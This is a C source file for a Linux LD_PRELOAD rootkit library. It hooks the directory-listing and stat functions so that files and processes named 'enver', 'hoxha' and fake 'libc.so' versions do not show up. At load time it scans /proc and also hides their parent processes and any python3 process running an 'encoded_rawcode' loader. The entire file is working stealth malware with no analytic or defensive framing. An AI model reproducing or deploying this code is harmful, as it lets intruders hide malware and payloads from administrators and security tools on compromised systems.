#define _GNU_SOURCE
#include <dlfcn.h>
#include <errno.h>
#include <stdio.h>
#include <ctype.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <stdint.h>

#define MAX_HIDDEN 32  // Increased to allow dynamic PID entries too

// static names to always hide
static const char *STATIC_HIDE_NAMES[] = {
    "enver",
    "hoxha",
    "libc.so.5",
    "libc.so.4",
    NULL
};

static char *hide_names[MAX_HIDDEN + 1] = { 0 };

// Helpers to add names or PIDs to hide
static void add_hide_name(const char *name) {
    for (int i = 0; i < MAX_HIDDEN; ++i) {
        if (!hide_names[i]) {
            hide_names[i] = strdup(name);
            return;
        }
    }
}

static void add_hide_pid(pid_t pid) {
    char buf[16];
    snprintf(buf, sizeof(buf), "%d", pid);
    add_hide_name(buf);
}

// Initialization to populate hide_names[]
__attribute__((constructor))
static void init_hide_names(void) {
    // Add static entries
    for (int i = 0; STATIC_HIDE_NAMES[i]; ++i) {
        add_hide_name(STATIC_HIDE_NAMES[i]);
    }

    // Scan /proc for dynamic hiding
    DIR *d = opendir("/proc");
    if (!d) return;

    struct dirent *e;
    while ((e = readdir(d))) {
        if (e->d_type != DT_DIR || !isdigit(e->d_name[0])) continue;

        pid_t pid = atoi(e->d_name);

        // Check /proc/[pid]/comm
        char comm_path[64];
        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
        FILE *f = fopen(comm_path, "r");
        if (!f) continue;

        char name[256];
        if (fgets(name, sizeof(name), f)) {
            name[strcspn(name, "\n")] = 0;

            if (strcmp(name, "hoxha") == 0 || strcmp(name, "enver") == 0) {
                add_hide_pid(pid);

                // Check PPID
                char status_path[64];
                snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);
                FILE *sf = fopen(status_path, "r");
                if (sf) {
                    char line[256];
                    while (fgets(line, sizeof(line), sf)) {
                        if (strncmp(line, "PPid:", 5) == 0) {
                            pid_t ppid = atoi(line + 5);
                            if (ppid > 1) {
                                add_hide_pid(ppid);
                            }
                            break;
                        }
                    }
                    fclose(sf);
                }
            }
        }
        fclose(f);

        // Check /proc/[pid]/cmdline for python3 -c with encoded loader
        char cmdline_path[64];
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
        FILE *cf = fopen(cmdline_path, "r");
        if (cf) {
            char cmdline[4096];
            size_t len = fread(cmdline, 1, sizeof(cmdline) - 1, cf);
            fclose(cf);

            cmdline[len] = '\0';
            if (strstr(cmdline, "python3") && strstr(cmdline, "encoded_rawcode")) {
                add_hide_pid(pid);
            }
        }
    }

    closedir(d);
}

// Cleanup
__attribute__((destructor))
static void cleanup_hide_names(void) {
    for (int i = 0; i < MAX_HIDDEN && hide_names[i]; ++i) {
        free(hide_names[i]);
        hide_names[i] = NULL;
    }
}

// Check if name matches hidden entry
static int libhide(const char *name) {
    for (int i = 0; i < MAX_HIDDEN && hide_names[i]; ++i) {
        if (strcmp(name, hide_names[i]) == 0) return 1;
    }
    return 0;
}

// Define the kernel dirent structures manually
struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

struct linux_dirent64 {
    uint64_t       d_ino;
    int64_t        d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

// Hook getdents and getdents64 syscalls using syscall wrappers
static long (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int) = NULL;
static long (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int) = NULL;

// Wrapper for getdents syscall
long getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    if (!orig_getdents) {
        *(void **)&orig_getdents = dlsym(RTLD_NEXT, "getdents");
        if (!orig_getdents) return -ENOSYS;
    }

    long ret = orig_getdents(fd, dirp, count);
    if (ret <= 0) return ret;

    struct linux_dirent *d;
    int bpos = 0;
    long new_ret = ret;

    while (bpos < ret) {
        d = (struct linux_dirent *)((char *)dirp + bpos);
        if (libhide(d->d_name)) {
            // Remove this entry by shifting subsequent entries
            int next_bpos = bpos + d->d_reclen;
            if (next_bpos < ret) {
                memmove((char *)dirp + bpos, (char *)dirp + next_bpos, ret - next_bpos);
            }
            new_ret -= d->d_reclen;
            ret = new_ret;
        } else {
            bpos += d->d_reclen;
        }
    }

    return new_ret;
}

// Wrapper for getdents64 syscall
long getdents64_syscall(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    if (!orig_getdents64) {
        *(void **)&orig_getdents64 = dlsym(RTLD_NEXT, "getdents64");
        if (!orig_getdents64) return -ENOSYS;
    }

    long ret = orig_getdents64(fd, dirp, count);
    if (ret <= 0) return ret;

    struct linux_dirent64 *d;
    int bpos = 0;
    long new_ret = ret;

    while (bpos < ret) {
        d = (struct linux_dirent64 *)((char *)dirp + bpos);
        if (libhide(d->d_name)) {
            // Remove this entry by shifting subsequent entries
            int next_bpos = bpos + d->d_reclen;
            if (next_bpos < ret) {
                memmove((char *)dirp + bpos, (char *)dirp + next_bpos, ret - next_bpos);
            }
            new_ret -= d->d_reclen;
            ret = new_ret;
        } else {
            bpos += d->d_reclen;
        }
    }

    return new_ret;
}

// Override the actual syscalls with correct signatures
ssize_t getdents(int fd, void *dirp, size_t count) {
    return getdents_syscall(fd, (struct linux_dirent *)dirp, count);
}

ssize_t getdents64(int fd, void *dirp, size_t count) {
    return getdents64_syscall(fd, (struct linux_dirent64 *)dirp, count);
}

// Stat hooks for tab complete and others
static int (*orig_stat)(const char *, struct stat *) = NULL;
static int (*orig_lstat)(const char *, struct stat *) = NULL;
static int (*orig_fstat)(int, struct stat *) = NULL;
static int (*orig_stat64)(const char *, struct stat64 *) = NULL;
static int (*orig_lstat64)(const char *, struct stat64 *) = NULL;
static int (*orig_fstat64)(int, struct stat64 *) = NULL;

static int should_hide_path(const char *path) {
    const char *basename = strrchr(path, '/');
    basename = basename ? basename + 1 : path;
    return libhide(basename);
}

int stat(const char *path, struct stat *buf) {
    if (!orig_stat) {
        *(void **)&orig_stat = dlsym(RTLD_NEXT, "stat");
    }
    
    if (should_hide_path(path)) {
        errno = ENOENT;
        return -1;
    }
    
    return orig_stat(path, buf);
}

int lstat(const char *path, struct stat *buf) {
    if (!orig_lstat) {
        *(void **)&orig_lstat = dlsym(RTLD_NEXT, "lstat");
    }
    
    if (should_hide_path(path)) {
        errno = ENOENT;
        return -1;
    }
    
    return orig_lstat(path, buf);
}

int fstat(int fd, struct stat *buf) {
    if (!orig_fstat) {
        *(void **)&orig_fstat = dlsym(RTLD_NEXT, "fstat");
    }
    return orig_fstat(fd, buf);
}

int stat64(const char *path, struct stat64 *buf) {
    if (!orig_stat64) {
        *(void **)&orig_stat64 = dlsym(RTLD_NEXT, "stat64");
    }
    
    if (should_hide_path(path)) {
        errno = ENOENT;
        return -1;
    }
    
    return orig_stat64(path, buf);
}

int lstat64(const char *path, struct stat64 *buf) {
    if (!orig_lstat64) {
        *(void **)&orig_lstat64 = dlsym(RTLD_NEXT, "lstat64");
    }
    
    if (should_hide_path(path)) {
        errno = ENOENT;
        return -1;
    }
    
    return orig_lstat64(path, buf);
}

int fstat64(int fd, struct stat64 *buf) {
    if (!orig_fstat64) {
        *(void **)&orig_fstat64 = dlsym(RTLD_NEXT, "fstat64");
    }
    return orig_fstat64(fd, buf);
}

// Readdir hooks 
static struct dirent *(*orig_readdir)(DIR *) = NULL;
static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        *(void **)&orig_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!orig_readdir) {
            errno = ENOSYS;
            return NULL;
        }
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (libhide(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    if (!orig_readdir64) {
        *(void **)&orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
        if (!orig_readdir64) {
            errno = ENOSYS;
            return NULL;
        }
    }

    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (libhide(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}
